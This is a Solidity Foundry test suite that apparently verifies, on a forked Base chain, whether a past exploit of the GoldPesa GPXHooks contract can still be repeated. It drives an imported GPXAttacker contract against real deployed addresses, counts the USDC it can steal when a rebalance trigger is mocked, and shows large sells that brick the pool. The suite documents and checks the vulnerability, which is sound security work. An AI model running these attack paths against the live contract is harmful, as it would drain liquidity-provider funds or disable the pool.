// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {GPXSim, IExtsload, IERC20Min, IHookState, IPOSMInfo, PoolKey5} from "../src/GPXSim.sol";
import {SwapHarness, GPXAttacker, IERC20A, IPOSMA, IPoolManagerA} from "../src/GPXAttacker.sol";

interface IERC721Min {
    function ownerOf(uint256) external view returns (address);
}

interface IPermit2A {
    function allowance(address, address, address) external view returns (uint160, uint48, uint48);
}

/// @title GoldPesa GPXHooks (Base) — Z3-H5 fork verification suite
/// @notice Read-only research: fork-only simulations, no mainnet transactions.
/// Fork: Base, pinned block 52,660,634 (chain tip at measurement 2026-10-16).
/// One fresh fork per test function; no snapshots, no mid-test resets.
contract GoldPesaTest is Test {
    uint256 constant FORK_BLOCK = 52_660_634;

    address constant HOOK = 0x4519e2b040ff1B64fa03aBe2AeF0BC99D7CcEaA8;
    address constant GPX = 0x454F8c3f1FC79a98363DB6104A20AC59A02A3133;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant POSM = 0x7C5f5A4bBd8fD63184577525326123B519429bDc;
    address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    address constant TREASURY = 0xa76b99311bc399d5fA7AeEd3bed0644eEd652866;

    uint256 constant POSITION_ID = 3_106_206;
    uint256 constant LAST_REBALANCE = 1_790_946_351; // 2026-10-02 13:05:51 UTC (exploit tx)
    uint256 constant POSITION_LIQ = 23_063_189_219_641_299;
    int24 constant LOWER_TICK = -275_982;
    int24 constant CUR_TICK = -259_906;
    uint256 constant USDC_SIDE = 28_951_640_789; // position USDC at fork block
    uint256 constant GPX_SIDE = 10_148_524_734_826_690_000_000; // approx (rounding)

    GPXSim sim;

    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = vm.envOr("FORK_RPC_URL", string("https://mainnet.base.org"));
        vm.createSelectFork(rpc, FORK_BLOCK);
        sim = new GPXSim();
    }

    function _fund(address who, address token, uint256 amount) internal {
        // GPX balances: slot 0 ; USDC (FiatTokenV2 proxy) balances: slot 9 (both verified on-chain)
        uint256 slot = token == USDC ? 9 : 0;
        vm.store(token, keccak256(abi.encode(who, slot)), bytes32(amount));
    }

    /// @dev Force the trigger via the gpxReserves storage slot (slot 9): circulating -> 10,000 GPX.
    ///      This is a MOCK of an economically unreachable state (see README §3), used to quantify the
    ///      conditional extraction.
    function _mockTrigger() internal {
        uint256[7] memory t = _simTuple();
        uint256 gpxIn = t[2];
        uint256 treasuryBal = IERC20Min(GPX).balanceOf(TREASURY);
        uint256 mockReserves = 100_000_000e18 - 10_000e18 - gpxIn - treasuryBal;
        vm.store(HOOK, bytes32(uint256(9)), bytes32(mockReserves));
        (bool r, int24 simTick,,,,,) = sim.simulate();
        emit log_named_int("mocked simulatedTick", simTick);
        assertTrue(r, "mocked trigger must be TRUE");
    }

    // ---------------------------------------------------------------- T1
    function test_T1_live_state_and_checkRebalance_false() public {
        assertEq(IHookState(HOOK).positionId(), POSITION_ID);
        assertEq(IHookState(HOOK).lastRebalance(), LAST_REBALANCE);
        assertEq(IHookState(HOOK).lowerTick(), LOWER_TICK);
        assertEq(IERC721Min(POSM).ownerOf(POSITION_ID), HOOK);
        assertEq(IERC20Min(GPX).balanceOf(HOOK), 99_930_888_384_260_767_462_321_773);
        assertEq(IERC20Min(USDC).balanceOf(HOOK), 0);

        (uint160 sp, int24 tick, uint128 liq) = sim.poolState(
            sim.poolIdOf(PoolKey5({currency0: GPX, currency1: USDC, fee: 0, tickSpacing: 1, hooks: HOOK}))
        );
        assertEq(uint256(liq), POSITION_LIQ, "pool liquidity == sole position liquidity");
        assertEq(int256(tick), int256(CUR_TICK));
        emit log_named_uint("sqrtPriceX96", sp);

        (bool r, int24 simTick, uint256 gpxIn, uint256 usdcIn, uint256 circ, int24 curTick, int24 lowerTick) =
            sim.simulate();
        emit log_named_int("simulatedTick", simTick);
        emit log_named_uint("gpxInsideUniswap", gpxIn);
        emit log_named_uint("usdcInsideUniswap", usdcIn);
        emit log_named_uint("gpxCirculatingSupply", circ);
        emit log_named_int("currentTick", curTick);
        emit log_named_int("currentLowerTick", lowerTick);
        emit log_named_string("checkRebalance", r ? "TRUE" : "FALSE");

        assertEq(usdcIn, USDC_SIDE, "USDC side of position");
        assertApproxEqAbs(gpxIn, GPX_SIDE, 1e12, "GPX side of position");
        assertEq(int256(lowerTick), int256(LOWER_TICK));
        assertFalse(r, "checkRebalance must be FALSE at fork block");
        assertLt(int256(simTick), int256(LOWER_TICK), "simulated tick below the band");
        assertGt(int256(LOWER_TICK) - int256(simTick), 30_000, "distance to band");
    }

    // ---------------------------------------------------------------- T2a
    function test_T2a_buy_sweep_no_trigger() public {
        SwapHarness h = new SwapHarness();
        _fund(address(h), USDC, 700_000e6);

        uint256[2] memory buys = [uint256(30_000e6), uint256(600_000e6)];
        for (uint256 i = 0; i < buys.length; i++) {
            h.doSwap(false, buys[i]);
            (bool r, int24 simTick,,,,,) = sim.simulate();
            emit log_named_uint("buy USDC", buys[i]);
            emit log_named_int("  simTick after", simTick);
            assertFalse(r, "no rebalance on buy");
            assertLt(int256(simTick), int256(LOWER_TICK), "simTick stays below band");
            assertEq(IHookState(HOOK).positionId(), POSITION_ID, "position untouched");
            assertEq(IHookState(HOOK).lastRebalance(), LAST_REBALANCE, "lastRebalance untouched");
        }
    }

    // ---------------------------------------------------------------- T2b
    function test_T2b_sell_20k_no_trigger() public {
        SwapHarness h = new SwapHarness();
        _fund(address(h), GPX, 100_000e18);
        h.doSwap(true, 20_000e18);
        (bool r, int24 simTick, uint256 gpxIn, uint256 usdcIn,,,) = sim.simulate();
        emit log_named_int("simTick after sell 20k", simTick);
        emit log_named_uint("usdcIn after", usdcIn);
        assertFalse(r, "no rebalance on sell");
        assertEq(IHookState(HOOK).positionId(), POSITION_ID, "position untouched");
        assertEq(IHookState(HOOK).lastRebalance(), LAST_REBALANCE, "lastRebalance untouched");
    }

    // ---------------------------------------------------------------- T2c
    /// Deep sell: drains the position's USDC, pins the price at the MIN limit with active liquidity 0,
    /// and bricks the pool (every further swap reverts in beforeSwap). Liveness only — no extraction.
    function test_T2c_deep_sell_100k_bricks_pool_no_trigger() public {
        SwapHarness h = new SwapHarness();
        _fund(address(h), GPX, 1_000_000e18);
        _fund(address(h), USDC, 1_000e6);
        h.doSwap(true, 100_000e18);
        (bool r, int24 simTick, uint256 gpxIn, uint256 usdcIn,,,) = sim.simulate();
        emit log_named_int("simTick after sell 100k", simTick);
        emit log_named_uint("usdcIn after", usdcIn);
        assertFalse(r, "no rebalance on sell");
        assertEq(usdcIn, 0, "position drained of USDC by deep sell");
        assertEq(IHookState(HOOK).positionId(), POSITION_ID, "position untouched");
        assertEq(IHookState(HOOK).lastRebalance(), LAST_REBALANCE, "lastRebalance untouched");
        vm.expectRevert();
        h.doSwap(false, 1e6);
        emit log_string("pool bricked: follow-up swap reverts (liveness, not extraction)");
    }

    // ---------------------------------------------------------------- T2d
    function test_T2d_deep_sell_2M_no_trigger() public {
        SwapHarness h = new SwapHarness();
        _fund(address(h), GPX, 2_000_000e18);
        h.doSwap(true, 2_000_000e18);
        (bool r, int24 simTick, uint256 gpxIn, uint256 usdcIn,,,) = sim.simulate();
        emit log_named_int("simTick after sell 2M", simTick);
        emit log_named_uint("usdcIn after", usdcIn);
        assertFalse(r, "no rebalance on sell");
        assertEq(usdcIn, 0, "position drained of USDC by deep sell");
        assertEq(IHookState(HOOK).positionId(), POSITION_ID, "position untouched");
        assertEq(IHookState(HOOK).lastRebalance(), LAST_REBALANCE, "lastRebalance untouched");
    }

    // ---------------------------------------------------------------- T3
    /// Live-state phantom-debt matrix. Each attack either completes with zero theft (no rebalance means the
    /// attacker's own burn exactly cancels their mint) or reverts (mint-ceil/burn-floor ~1 wei residue ->
    /// TAKE_PAIR DeltaNotPositive). Reverted calls change no state, so all four run on one pristine fork.
    function test_T3_phantom_debt_matrix_live_state_all_zero() public {
        uint256[4] memory debts = [uint256(1_000e6), 10_000e6, USDC_SIDE, 100_000e6];
        for (uint256 i = 0; i < debts.length; i++) {
            GPXAttacker a = new GPXAttacker();
            _fund(address(a), USDC, 1_000e6); // buffer to absorb swap costs
            uint256 loan = 12_000e6;
            try a.attack(debts[i], 5_500e6, loan) {
                emit log_named_uint("debt D", debts[i]);
                emit log_named_uint("  stolen", a.stolenUSDC());
                emit log_named_uint("  net USDC after repay", a.netUSDC());
                assertEq(a.stolenUSDC(), 0, "no theft without rebalance");
                assertEq(IHookState(HOOK).positionId(), POSITION_ID, "position untouched");
                assertEq(IHookState(HOOK).lastRebalance(), LAST_REBALANCE, "no rebalance fired");
            } catch (bytes memory err) {
                emit log_named_uint("debt D", debts[i]);
                emit log_named_bytes("  REVERTED", err);
                assertEq(a.stolenUSDC(), 0, "no theft");
                assertEq(IHookState(HOOK).lastRebalance(), LAST_REBALANCE, "no rebalance fired");
            }
        }
    }

    // ---------------------------------------------------------------- T4a
    /// MOCKED trigger (see _mockTrigger): quantifies the conditional extraction.
    function test_T4a_mocked_trigger_extracts_up_to_usdc_side() public {
        (,,,, uint256 circ,,) = sim.simulate();
        assertEq(circ, 57_991_314_994_060_290_519_905, "live circulating supply");
        _mockTrigger();
        (bool r2, , , uint256 usdcIn2, uint256 circ2,,) = sim.simulate();
        assertTrue(r2, "mocked trigger must be TRUE");
        assertEq(usdcIn2, USDC_SIDE, "USDC side unchanged");
        assertEq(circ2, 10_000e18, "mocked circulating supply");

        GPXAttacker a = new GPXAttacker();
        _fund(address(a), USDC, 1_000e6);
        a.attack(28_000e6, 5_500e6, 12_000e6);
        emit log_named_uint("D=28,000e6 stolen", a.stolenUSDC());
        emit log_named_uint("phantom tokenId", a.phantomTokenId());
        assertApproxEqAbs(a.stolenUSDC(), 28_000e6, 1e4, "stolen == D");
        // the hook's re-mint is the token minted immediately after the attacker's phantom position
        assertEq(IHookState(HOOK).positionId(), a.phantomTokenId() + 1, "new position minted");
        assertGt(IHookState(HOOK).lastRebalance(), LAST_REBALANCE, "rebalance fired");
    }

    // ---------------------------------------------------------------- T4b
    function test_T4b_mocked_trigger_boundary_D_equals_B() public {
        _mockTrigger();
        GPXAttacker a = new GPXAttacker();
        _fund(address(a), USDC, 1_000e6);
        try a.attack(USDC_SIDE, 5_500e6, 12_000e6) {
            emit log_named_uint("D=USDC_SIDE stolen", a.stolenUSDC());
            assertApproxEqAbs(a.stolenUSDC(), USDC_SIDE, 1e4);
        } catch (bytes memory err) {
            emit log_named_bytes("D=USDC_SIDE reverted", err);
        }
    }

    // ---------------------------------------------------------------- T4c
    function test_T4c_mocked_trigger_D_gt_B_reverts() public {
        _mockTrigger();
        GPXAttacker a = new GPXAttacker();
        _fund(address(a), USDC, 1_000e6);
        bool reverted;
        try a.attack(USDC_SIDE + 1, 5_500e6, 12_000e6) {
            emit log_named_uint("D=B+1 stolen (unexpected)", a.stolenUSDC());
        } catch {
            reverted = true;
            emit log_string("D=B+1 reverted as expected (TAKE_PAIR DeltaNotPositive)");
        }
        assertTrue(reverted, "D > burn credit must revert");
    }

    // ---------------------------------------------------------------- T4d
    function test_T4d_mocked_trigger_historical_115k_reverts() public {
        _mockTrigger();
        GPXAttacker a = new GPXAttacker();
        _fund(address(a), USDC, 1_000e6);
        bool reverted;
        try a.attack(115_000e6, 5_500e6, 120_000e6) {
            emit log_named_uint("D=115k stolen (unexpected)", a.stolenUSDC());
        } catch {
            reverted = true;
            emit log_string("D=115k reverted as expected");
        }
        assertTrue(reverted, "D=115k > burn credit must revert");
    }

    // ---------------------------------------------------------------- T5
    function test_T5_residual_allowances_state() public {
        (uint160 amount, uint48 exp, uint48 nonce) = IPermit2A(PERMIT2).allowance(HOOK, GPX, POSM);
        emit log_named_uint("Permit2 GPX allowance (hook->POSM)", amount);
        emit log_named_uint("Permit2 expiry", exp);
        assertEq(uint256(amount), 92_781_203_640_212_676_485, "GPX Permit2 allowance");
        assertEq(uint256(exp), 281_474_976_710_655, "uint48.max expiry");
        assertEq(uint256(nonce), 0);
        assertEq(IERC20Min(GPX).allowance(HOOK, PERMIT2), 92_781_203_640_212_676_485, "ERC20 allowance hook->permit2");

        (uint160 uAmount, uint48 uExp, uint48 uNonce) = IPermit2A(PERMIT2).allowance(HOOK, USDC, POSM);
        emit log_named_uint("Permit2 USDC allowance", uAmount);
        assertEq(uint256(uAmount), 338_686_030);
        assertEq(uint256(uExp), 281_474_976_710_655);
        assertEq(uint256(uNonce), 0);
        assertEq(IERC20Min(USDC).allowance(HOOK, PERMIT2), 338_686_030);
        assertEq(IERC20Min(USDC).balanceOf(HOOK), 0, "USDC allowance unusable (hook holds 0 USDC)");
        assertGt(IERC20Min(GPX).balanceOf(HOOK), uint256(amount), "hook holds far more GPX than the allowance");

        // Negative control: on this PM version (older v4-periphery), SETTLE payer is ONLY the caller or the PM itself
        // (BaseActionsRouter._mapPayer(bool)); a third party (the hook) can never be named as payer.
        bytes memory actions = abi.encodePacked(uint8(0x0b)); // SETTLE
        bytes[] memory params = new bytes[](1);
        params[0] = abi.encode(GPX, uint256(1e18), false); // payerIsUser=false -> payer = address(PositionManager)
        vm.expectRevert();
        IPOSMA(POSM).modifyLiquidities(abi.encode(actions, params), block.timestamp + 100);
        emit log_string("SETTLE with payer=PM reverts (PM holds no GPX; hook is not a selectable payer)");
    }

    // ---------------------------------------------------------------- T6
    function test_T6_rearm_threshold_exact() public {
        (uint256 thr, uint256 nPrime, uint256 treasuryToday) = sim.rearmThreshold();
        emit log_named_uint("non-reserve GPX (N')", nPrime);
        emit log_named_uint("treasury today", treasuryToday);
        emit log_named_uint("treasury threshold for trigger", thr);
        emit log_named_uint("additional GPX needed into treasury", thr - treasuryToday);
        assertApproxEqAbs(thr, 46_439_000_000_000_000_000_000, 2e20, "threshold ~46,439.5 GPX");
        assertApproxEqAbs(nPrime, 69_111_615_700_000_000_000_000, 2e20, "N' ~69,111.6 GPX");
        assertEq(treasuryToday, 971_776_010_345_558_154_699);
        // trigger needs > 65% of ALL non-reserve GPX absorbed into the treasury
        assertGe((thr - treasuryToday) * 100 / nPrime, 65);
        assertLe((thr - treasuryToday) * 100 / nPrime, 70);
    }

    // ---------------------------------------------------------------- T7
    function test_T7_transfer_fee_absorption_scale() public {
        address a1 = makeAddr("a1");
        address a2 = makeAddr("a2");
        _fund(a1, GPX, 20_000e18);

        (uint256 thr, , uint256 t0) = sim.rearmThreshold();
        (, int24 sim0,,,,,) = sim.simulate();

        for (uint256 i = 0; i < 20; i++) {
            uint256 b1 = IERC20A(GPX).balanceOf(a1);
            vm.prank(a1);
            IERC20A(GPX).transfer(a2, b1);
            uint256 b2 = IERC20A(GPX).balanceOf(a2);
            vm.prank(a2);
            IERC20A(GPX).transfer(a1, b2);
        }

        uint256 t1 = IERC20Min(GPX).balanceOf(TREASURY);
        (, int24 sim1,,,,,) = sim.simulate();
        emit log_named_uint("treasury gained (wei)", t1 - t0);
        emit log_named_int("simTick delta", int256(sim1) - int256(sim0));
        emit log_named_uint("still needed into treasury (wei)", thr - t1);

        assertGt(t1, t0, "treasury absorbs transfer fees");
        assertGt(int256(sim1), int256(sim0), "simTick moves up");
        assertLt(int256(sim1), int256(LOWER_TICK), "but stays far below the band");
        assertLt(t1 - t0, 4_000e18);
    }

    function _simTuple() internal view returns (uint256[7] memory t) {
        (bool r, int24 simTick, uint256 gpxIn, uint256 usdcIn, uint256 circ, int24 curTick, int24 lowerTick) =
            sim.simulate();
        t[0] = r ? 1 : 0;
        t[1] = uint256(int256(simTick));
        t[2] = gpxIn;
        t[3] = usdcIn;
        t[4] = circ;
        t[5] = uint256(int256(curTick));
        t[6] = uint256(int256(lowerTick));
    }
}
